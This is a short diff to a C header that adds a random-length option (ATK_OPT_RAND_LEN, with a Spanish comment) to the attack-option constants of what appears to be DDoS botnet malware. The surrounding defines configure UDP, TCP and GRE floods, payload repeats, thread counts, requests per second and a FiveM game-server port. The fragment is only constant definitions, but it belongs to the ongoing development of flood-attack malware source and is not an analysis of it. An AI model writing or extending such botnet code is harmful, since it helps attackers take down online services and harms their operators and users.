@@ -95,9 +95,10 @@ struct Attack {
 #define ATK_OPT_MAX_SIZE        27  // maximum packet size
 #define ATK_OPT_PAYLOAD_ONE     28  // custom payload
 #define ATK_OPT_PAYLOAD_REPEAT  29  //How many times to repeat custom payload in packet (for UDP, TCP, and GRE floods)
-#define ATK_OPT_KEEPALIVE    31
-#define ATK_OPT_RANDOMIZE    32
-#define ATK_OPT_RPS          33
+#define ATK_OPT_RAND_LEN        30   // o cualquier número no usado
+#define ATK_OPT_KEEPALIVE       31
+#define ATK_OPT_RANDOMIZE       32
+#define ATK_OPT_RPS             33
 #define ATK_OPT_THREADS         34
 #define ATK_OPT_DURATION        35
 #define ATK_OPT_FIVEM_PORT      36
